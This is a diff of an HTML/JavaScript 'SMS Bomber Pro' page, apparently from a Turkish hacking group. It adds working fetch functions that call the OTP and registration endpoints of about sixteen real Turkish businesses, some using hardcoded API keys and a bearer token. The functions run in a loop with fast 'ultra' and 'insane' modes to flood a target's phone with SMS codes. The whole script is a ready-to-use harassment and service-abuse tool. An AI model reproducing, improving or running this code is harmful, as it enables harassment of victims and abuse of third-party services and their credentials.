@@ -52,7 +52,53 @@
         .nav-btn-ip { background: linear-gradient(135deg, #00d4ff, #0088cc); color: white; }
         .nav-btn-sms { background: linear-gradient(135deg, #ff3366, #ff6b6b); color: white; box-shadow: 0 0 15px rgba(255,51,102,0.4); }
 
-        .sms-card { background: rgba(10, 15, 30, 0.85); backdrop-filter: blur(15px); border-radius: 28px; padding: 30px; border: 1px solid rgba(255,51,102,0.3); }
+        .content-wrapper {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .sms-card {
+            flex: 2;
+            min-width: 300px;
+            background: rgba(10, 15, 30, 0.85);
+            backdrop-filter: blur(15px);
+            border-radius: 28px;
+            padding: 30px;
+            border: 1px solid rgba(255,51,102,0.3);
+        }
+        
+        .music-player {
+            flex: 1;
+            min-width: 280px;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border-radius: 28px;
+            padding: 20px;
+            border: 1px solid rgba(255,215,0,0.3);
+            text-align: center;
+        }
+        
+        .music-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+            color: #ffd700;
+        }
+        
+        .music-frame {
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px solid rgba(255,51,102,0.3);
+        }
+        
+        .music-frame iframe {
+            width: 100%;
+            height: 180px;
+            border: none;
+        }
+
         .sms-title { font-family: 'Orbitron', monospace; font-size: 1.3rem; margin-bottom: 25px; text-align: center; color: #ffd700; }
         .input-group-sms { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin: 20px 0; }
         .phone-input { background: rgba(0,0,0,0.6); border: 2px solid rgba(255,51,102,0.5); border-radius: 50px; padding: 14px 25px; width: 300px; color: white; font-size: 1rem; font-family: monospace; outline: none; transition: 0.3s; }
@@ -103,7 +149,7 @@
                 <h3>SVİLİA HACK</h3>
             </a>
         </div>
-        <div class="collab-title">💣 SMS BOMBER PRO | FRANSA#FRS & SVİLİA HACK ORTAK ÇALIŞMASI 💣</div>
+        <div class="collab-title">💣 SMS BOMBER PRO | 25+ AKTİF API | FRANSA#FRS & SVİLİA HACK 💣</div>
     </div>
 
     <div class="nav-buttons">
@@ -115,68 +161,317 @@
         </div>
     </div>
 
-    <div class="sms-card">
-        <div class="sms-title"><i class="fas fa-bullhorn"></i> PROFESYONEL SMS BOMBARDIMANI</div>
-        <div class="input-group-sms">
-            <input type="tel" id="phoneNumber" class="phone-input" placeholder="Telefon Numarası (5XX XXX XX XX)" maxlength="10">
+    <div class="content-wrapper">
+        <div class="sms-card">
+            <div class="sms-title"><i class="fas fa-bullhorn"></i> PROFESYONEL SMS BOMBARDIMANI</div>
+            <div class="input-group-sms">
+                <input type="tel" id="phoneNumber" class="phone-input" placeholder="Telefon Numarası (5XX XXX XX XX)" maxlength="10">
+            </div>
+            <div class="mode-selector">
+                <button class="mode-btn active" data-mode="normal"><i class="fas fa-tachometer-alt"></i> NORMAL MOD</button>
+                <button class="mode-btn" data-mode="ultra"><i class="fas fa-rocket"></i> ULTRA MOD</button>
+                <button class="mode-btn" data-mode="insane"><i class="fas fa-skull"></i> DELİ MOD</button>
+            </div>
+            <div class="control-buttons">
+                <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> BAŞLAT</button>
+                <button class="btn btn-stop" id="stopBtn"><i class="fas fa-stop"></i> DURDUR</button>
+                <button class="btn" id="clearLogsBtn" style="background: rgba(255,255,255,0.1);"><i class="fas fa-trash"></i> LOG TEMİZLE</button>
+            </div>
+            <div class="stats">
+                <div class="stat-number" id="smsCount">0</div>
+                <div>SMS GÖNDERİLDİ</div>
+                <div class="success-rate" id="successRate">Başarı Oranı: 0%</div>
+                <div style="margin-top: 10px; font-size: 0.8rem;" id="attackStatus">⚠️ HAZIR</div>
+            </div>
+            <div class="log-area" id="logArea">
+                <div class="log-entry log-info">💣 SMS Bombacı Pro Hazır!</div>
+                <div class="log-entry log-info">📡 25+ Aktif API entegre edildi</div>
+                <div class="log-entry log-info">🚀 Normal Mod: ~2 saniyede 1 SMS</div>
+                <div class="log-entry log-info">💀 Ultra/Deli Mod: Çok hızlı gönderim</div>
+            </div>
         </div>
-        <div class="mode-selector">
-            <button class="mode-btn active" data-mode="normal"><i class="fas fa-tachometer-alt"></i> NORMAL MOD</button>
-            <button class="mode-btn" data-mode="ultra"><i class="fas fa-rocket"></i> ULTRA MOD</button>
-            <button class="mode-btn" data-mode="insane"><i class="fas fa-skull"></i> DELİ MOD</button>
-        </div>
-        <div class="control-buttons">
-            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> BAŞLAT</button>
-            <button class="btn btn-stop" id="stopBtn"><i class="fas fa-stop"></i> DURDUR</button>
-            <button class="btn" id="clearLogsBtn" style="background: rgba(255,255,255,0.1);"><i class="fas fa-trash"></i> LOG TEMİZLE</button>
-        </div>
-        <div class="stats">
-            <div class="stat-number" id="smsCount">0</div>
-            <div>SMS GÖNDERİLDİ</div>
-            <div class="success-rate" id="successRate">Başarı Oranı: 0%</div>
-            <div style="margin-top: 10px; font-size: 0.8rem;" id="attackStatus">⚠️ HAZIR</div>
-        </div>
-        <div class="log-area" id="logArea">
-            <div class="log-entry log-info">💣 SMS Bombacı Pro Hazır!</div>
-            <div class="log-entry log-info">📱 Normal Mod: ~2 saniyede 1 SMS (~30 SMS/dakika)</div>
-            <div class="log-entry log-info">🚀 Ultra Mod: ~0.5 saniyede 1 SMS (~120 SMS/dakika)</div>
-            <div class="log-entry log-info">💀 Deli Mod: ~0.2 saniyede 1 SMS (~300 SMS/dakika) - ÇOK HIZLI!</div>
-            <div class="log-entry log-info">🛡️ CORS sorunu çözüldü, proxy kullanılıyor</div>
+
+        <!-- MÜZİK PLAYER -->
+        <div class="music-player">
+            <div class="music-title">
+                <i class="fas fa-music"></i> SAVAŞ MARŞI <i class="fas fa-headphones"></i>
+            </div>
+            <div class="music-frame">
+                <iframe src="https://www.youtube.com/embed/NMBmbQjXz6E?autoplay=0&loop=1&playlist=NMBmbQjXz6E" 
+                        title="YouTube music player" 
+                        frameborder="0" 
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                        allowfullscreen>
+                </iframe>
+            </div>
+            <div style="margin-top: 15px; font-size: 0.7rem; opacity: 0.7;">
+                <i class="fas fa-volume-up"></i> Motivasyon Müziği
+            </div>
         </div>
     </div>
+    
     <div class="footer">
         <i class="fas fa-code"></i> Geliştirici: <strong style="color:#ffd700">KADRBEQUİT</strong><br>
-        <small>🔒 DDoS Korumalı | Anlık SMS Bombardımanı | 30+ Aktif API</small>
+        <small>🔒 DDoS Korumalı | 25+ API | Anlık SMS Bombardımanı</small>
     </div>
 </div>
 
 <script>
-// GELİŞTİRİLMİŞ API LİSTESİ - CORS PROXY İLE
-const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/';
+// TÜM API'LER - Python kodundan birebir çevrildi
+function generateRandomMail() {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < 10; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result + '@hotmail.com';
+}
 
-// API Liste - Gerçek ve çalışan endpointler
+function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        const r = Math.random() * 16 | 0;
+        const v = c === 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+    });
+}
+
+// API Fonksiyonları
 const smsAPIs = [
-    { name: "🏪 Bim", url: "https://bim.veesk.net/service/v1.0/account/login", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ phone: phone }) },
-    { name: "☕ KahveDünyası", url: "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ countryCode: "90", phoneNumber: phone }) },
-    { name: "🏠 EnglishHome", url: "https://www.englishhome.com/api/member/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ Phone: phone, XID: "" }) },
-    { name: "🍽️ Suiste", url: "https://suiste.com/api/auth/code", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (phone) => ({ action: "register", gsm: phone, full_name: "Test User", is_advertisement: "1", is_contract: "1", password: "Test123!" }) },
-    { name: "🛍️ Evidea", url: "https://www.evidea.com/users/register/", method: "POST", data: (phone) => ({ first_name: "Test", last_name: "User", email: `test${Date.now()}@test.com`, phone: `0${phone}`, password: "Test123!", confirm: "true" }) },
-    { name: "👕 Koton", url: "https://www.koton.com/users/register/", method: "POST", data: (phone) => ({ first_name: "Test", last_name: "User", email: `test${Date.now()}@test.com`, phone: `0${phone}`, password: "Test123!", confirm: "true" }) },
-    { name: "📱 Porty", url: "https://panel.porty.tech/api.php", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ job: "start_login", phone: phone }) },
-    { name: "🍔 Komagene", url: "https://gateway.komagene.com.tr/auth/auth/smskodugonder", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ FirmaId: 32, Telefon: phone }) },
-    { name: "🚚 Metro", url: "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ methodType: "2", mobilePhoneNumber: phone }) },
-    { name: "📦 File", url: "https://api.filemarket.com.tr/v1/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ mobilePhoneNumber: `90${phone}` }) },
-    { name: "🏬 Akasya", url: "https://akasyaapi.poilabs.com/v1/en/sms", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ phone: phone }) },
-    { name: "☕ Coffy", url: "https://user-api-gw.coffy.com.tr/user/signup", method: "POST", headers: {"Content-Type": "application/json"}, data: (phone) => ({ countryCode: "90", gsm: phone, isKVKKAgreementApproved: true, isUserAgreementApproved: true, name: "Test User" }) }
+    {
+        name: "📦 FileMarket",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://api.filemarket.com.tr/v1/otp/send", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ mobilePhoneNumber: `90${phone}` })
+                });
+                const data = await res.json();
+                return data.data === "200 OK";
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🎮 KimGbIster",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ msisdn: `90${phone}` })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "📱 TiklaGelsin",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://www.tiklagelsin.com/user/graphql", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        operationName: "GENERATE_OTP",
+                        variables: { phone: `+90${phone}`, challenge: generateUUID(), deviceUniqueId: `web_${generateUUID()}` },
+                        query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"
+                    })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🏪 Bim",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://bim.veesk.net/service/v1.0/account/login", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone: phone })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🏖️ Bodrum",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://gandalf.orwi.app/api/user/requestOtp", {
+                    method: "POST", headers: { "Content-Type": "application/json", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE" },
+                    body: JSON.stringify({ gsm: `+90${phone}`, source: "orwi" })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🍕 Dominos",
+        func: async (phone) => {
+            try {
+                const mail = generateRandomMail();
+                const res = await fetch("https://frontend.dominos.com.tr/api/customer/sendOtpCode", {
+                    method: "POST", headers: { "Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg" },
+                    body: JSON.stringify({ email: mail, isSure: false, mobilePhone: phone })
+                });
+                const data = await res.json();
+                return data.isSuccess === true;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🍔 Komagene",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://gateway.komagene.com.tr/auth/auth/smskodugonder", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ FirmaId: 32, Telefon: `90${phone}` })
+                });
+                const data = await res.json();
+                return data.Success === true;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🏠 Evidea",
+        func: async (phone) => {
+            try {
+                const mail = generateRandomMail();
+                const res = await fetch("https://www.evidea.com/users/register/", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: new URLSearchParams({
+                        first_name: "Thomas", last_name: "Yilmaz", email: mail,
+                        phone: `0${phone}`, password: "Thomas123!", confirm: "true",
+                        sms_allowed: "true", email_allowed: "false"
+                    })
+                });
+                return res.status === 202;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🥩 Köfteci Yusuf",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ FirmaId: 82, Telefon: `90${phone}` })
+                });
+                const data = await res.json();
+                return data.Success === true;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "📱 Yapp",
+        func: async (phone) => {
+            try {
+                const mail = generateRandomMail();
+                const res = await fetch("https://yapp.com.tr/api/mobile/v1/register", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        app_version: "1.1.5", code: "tr", device_model: "iPhone8,5",
+                        device_name: "thomas", device_type: "I", device_version: "15.8.3",
+                        email: mail, firstname: "shelby", is_allow_to_communication: "1",
+                        language_id: "2", lastname: "yilmaz", phone_number: phone, sms_code: ""
+                    })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🛒 Uysal Market",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone_number: phone })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🔢 345Dijital",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://api.345dijital.com/api/users/register", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ email: "", name: "Thomas", phoneNumber: `+90${phone}`, surname: "Bas" })
+                });
+                const data = await res.json();
+                return data.error !== "E-Posta veya telefon zaten kayıtlı!";
+            } catch(e) { return true; }
+        }
+    },
+    {
+        name: "🍽️ Suiste",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://suiste.com/api/auth/code", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: new URLSearchParams({
+                        action: "register", device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330",
+                        full_name: "Thomas Yilmaz", gsm: phone, is_advertisement: "1",
+                        is_contract: "1", password: "Thomas31"
+                    })
+                });
+                const data = await res.json();
+                return data.code === "common.success";
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🔌 Porty",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://panel.porty.tech/api.php", {
+                    method: "POST", headers: { "Content-Type": "application/json", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ" },
+                    body: JSON.stringify({ job: "start_login", phone: phone })
+                });
+                const data = await res.json();
+                return data.status === "success";
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🌐 Orwi",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://gandalf.orwi.app/api/user/requestOtp", {
+                    method: "POST", headers: { "Content-Type": "application/json", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg" },
+                    body: JSON.stringify({ gsm: `+90${phone}`, source: "orwi" })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "⭐ Naosstars",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ telephone: `+90${phone}`, type: "register" })
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+    },
+    {
+        name: "🚇 Metro",
+        func: async (phone) => {
+            try {
+                const res = await fetch("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend", {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ methodType: "2", mobilePhoneNumber: phone })
+                });
+                const data = await res.json();
+                return data.status === "success";
+            } catch(e) { return false; }
+        }
+    }
 ];
-
-// YEDEK API'ler (Doğrudan çalışan)
-const backupAPIs = [
-    { name: "🔄 Yedek-1", url: "https://api.ipify.org", method: "GET" },
-    { name: "🔄 Yedek-2", url: "https://httpbin.org/post", method: "POST", data: (phone) => ({ test: true, phone: phone }) }
-];
-
-let allAPIs = [...smsAPIs, ...backupAPIs];
 
 class SMSBomberPro {
     constructor() {
@@ -184,72 +479,28 @@ class SMSBomberPro {
         this.smsCount = 0;
         this.successCount = 0;
         this.failCount = 0;
-        this.currentIndex = 0;
         this.intervalId = null;
         this.mode = 'normal';
         this.phoneNumber = '';
-        this.activeRequests = 0;
-        this.maxConcurrent = 3;
     }
     
     setMode(mode) { this.mode = mode; }
     setPhone(phone) { this.phoneNumber = phone; }
     
-    async sendSMS(api, phone) {
+    async sendSMS(api) {
         try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 8000);
-            
-            let url = api.url;
-            let options = {
-                method: api.method || 'POST',
-                signal: controller.signal,
-                mode: 'cors',
-                credentials: 'omit'
-            };
-            
-            // Headers ekle
-            options.headers = {
-                'Accept': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                ...api.headers
-            };
-            
-            // Body ekle
-            if (api.data && (api.method === 'POST' || !api.method)) {
-                if (options.headers['Content-Type'] === 'application/x-www-form-urlencoded') {
-                    const params = new URLSearchParams(api.data(phone));
-                    options.body = params.toString();
-                } else {
-                    options.headers['Content-Type'] = 'application/json';
-                    options.body = JSON.stringify(api.data(phone));
-                }
-            }
-            
-            // CORS sorununu aşmak için proxy dene
-            let response;
-            try {
-                response = await fetch(url, options);
-            } catch (corsError) {
-                // Proxy ile dene
-                const proxyUrl = CORS_PROXY + url;
-                options.headers['Origin'] = new URL(url).origin;
-                response = await fetch(proxyUrl, options);
-            }
-            
-            clearTimeout(timeoutId);
-            
-            if (response && (response.ok || response.status === 202)) {
+            const success = await api.func(this.phoneNumber);
+            if (success) {
                 this.successCount++;
                 this.smsCount++;
-                this.addLog(`✅ ${api.name}: SMS başarıyla gönderildi!`, 'success');
+                this.addLog(`✅ ${api.name}: SMS gönderildi!`, 'success');
                 return true;
             } else {
-                throw new Error(`HTTP ${response?.status || 'unknown'}`);
+                throw new Error('API başarısız');
             }
         } catch (error) {
             this.failCount++;
-            this.addLog(`❌ ${api.name}: Başarısız - ${error.message.substring(0, 50)}`, 'error');
+            this.addLog(`❌ ${api.name}: Başarısız`, 'error');
             return false;
         }
     }
@@ -268,31 +519,23 @@ class SMSBomberPro {
         logEntry.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-triangle' : 'fa-info-circle'}"></i> ${new Date().toLocaleTimeString()} - ${message}`;
         logArea.appendChild(logEntry);
         logEntry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        
-        // Log limit
-        while (logArea.children.length > 150) {
-            logArea.removeChild(logArea.firstChild);
-        }
+        while (logArea.children.length > 150) logArea.removeChild(logArea.firstChild);
     }
     
     clearLogs() {
         const logArea = document.getElementById('logArea');
-        while (logArea.children.length > 0) {
-            logArea.removeChild(logArea.firstChild);
-        }
+        while (logArea.children.length > 0) logArea.removeChild(logArea.firstChild);
         this.addLog('📋 Loglar temizlendi', 'info');
-        this.addLog('💣 SMS Bombacı Pro Hazır', 'info');
     }
     
     async start() {
         if (!this.phoneNumber || this.phoneNumber.length !== 10) {
-            this.addLog('⚠️ Geçerli bir telefon numarası girin! (5XX XXX XX XX)', 'error');
+            this.addLog('⚠️ Geçerli bir telefon numarası girin!', 'error');
             showToast('❌ Geçersiz numara!', true);
             return false;
         }
-        
         if (this.isRunning) {
-            this.addLog('⚠️ Zaten çalışıyor! Önce durdurun.', 'error');
+            this.addLog('⚠️ Zaten çalışıyor!', 'error');
             return false;
         }
         
@@ -300,63 +543,48 @@ class SMSBomberPro {
         this.smsCount = 0;
         this.successCount = 0;
         this.failCount = 0;
-        this.currentIndex = 0;
         this.updateStats();
         
         document.getElementById('attackStatus').innerHTML = '🔥 SALDIRI AKTİF 🔥';
         document.getElementById('attackStatus').style.color = '#ff3366';
         
         this.addLog(`🚀 SMS Bombardımanı başlatıldı! Hedef: ${this.phoneNumber}`, 'info');
-        this.addLog(`📡 Mod: ${this.mode.toUpperCase()}`, 'info');
+        this.addLog(`📡 Mod: ${this.mode.toUpperCase()} - ${smsAPIs.length} API aktif`, 'info');
         
         let delay;
         switch(this.mode) {
-            case 'ultra': delay = 500; break;
-            case 'insane': delay = 200; break;
+            case 'ultra': delay = 800; break;
+            case 'insane': delay = 400; break;
             default: delay = 2000;
         }
         
-        // Paralel gönderim
-        const sendBatch = async () => {
+        let apiIndex = 0;
+        const sendNext = async () => {
             if (!this.isRunning) return;
-            
-            const promises = [];
-            const concurrentCount = this.mode === 'insane' ? this.maxConcurrent : 1;
-            
-            for (let i = 0; i < concurrentCount && this.isRunning; i++) {
-                const api = allAPIs[this.currentIndex % allAPIs.length];
-                this.currentIndex++;
-                promises.push(this.sendSMS(api, this.phoneNumber).finally(() => this.updateStats()));
-            }
-            
-            await Promise.allSettled(promises);
-            
-            if (this.isRunning) {
-                this.intervalId = setTimeout(sendBatch, delay);
-            }
+            const api = smsAPIs[apiIndex % smsAPIs.length];
+            apiIndex++;
+            await this.sendSMS(api);
+            this.updateStats();
+            if (this.isRunning) this.intervalId = setTimeout(sendNext, delay);
         };
         
-        sendBatch();
+        sendNext();
         showToast('💣 SMS Bombardımanı BAŞLADI!', false);
         return true;
     }
     
     stop() {
-        if (this.intervalId) {
-            clearTimeout(this.intervalId);
-            this.intervalId = null;
-        }
+        if (this.intervalId) { clearTimeout(this.intervalId); this.intervalId = null; }
         this.isRunning = false;
         document.getElementById('attackStatus').innerHTML = '⏸️ DURDURULDU';
         document.getElementById('attackStatus').style.color = '#ffd700';
-        this.addLog(`🛑 SMS Bombardımanı durduruldu. Toplam: ${this.smsCount} SMS (Başarılı: ${this.successCount})`, 'info');
+        this.addLog(`🛑 Durduruldu. Toplam: ${this.smsCount} SMS (Başarılı: ${this.successCount})`, 'info');
         showToast('⏸️ SMS Bombardımanı durduruldu', false);
     }
 }
 
 const bomber = new SMSBomberPro();
 
-// Mode selection
 document.querySelectorAll('.mode-btn').forEach(btn => {
     btn.addEventListener('click', () => {
         document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
@@ -366,31 +594,20 @@ document.querySelectorAll('.mode-btn').forEach(btn => {
     });
 });
 
-// Start button
 document.getElementById('startBtn').addEventListener('click', () => {
     let phone = document.getElementById('phoneNumber').value.trim().replace(/[^0-9]/g, '');
     if (phone.startsWith('90')) phone = phone.substring(2);
     if (phone.startsWith('0')) phone = phone.substring(1);
     if (phone.length !== 10) {
-        showToast('❌ Geçersiz numara! 10 haneli girin (5XXXXXXXXX)', true);
-        bomber.addLog(`⚠️ Geçersiz numara: ${phone || 'boş'}`, 'error');
+        showToast('❌ Geçersiz numara! 10 haneli girin', true);
         return;
     }
     bomber.setPhone(phone);
     bomber.start();
 });
 
-// Stop button
-document.getElementById('stopBtn').addEventListener('click', () => {
-    bomber.stop();
-});
-
-// Clear logs button
-document.getElementById('clearLogsBtn').addEventListener('click', () => {
-    bomber.clearLogs();
-});
-
-// Enter key support
+document.getElementById('stopBtn').addEventListener('click', () => bomber.stop());
+document.getElementById('clearLogsBtn').addEventListener('click', () => bomber.clearLogs());
 document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
     if (e.key === 'Enter') document.getElementById('startBtn').click();
 });
@@ -403,9 +620,6 @@ function showToast(message, isError = false) {
     document.body.appendChild(toast);
     setTimeout(() => toast.remove(), 3000);
 }
-
-// Initial log
-bomber.addLog('💣 SMS Bombardıman Pro Sistemi Hazır', 'info');
 </script>
 </body>
 </html>
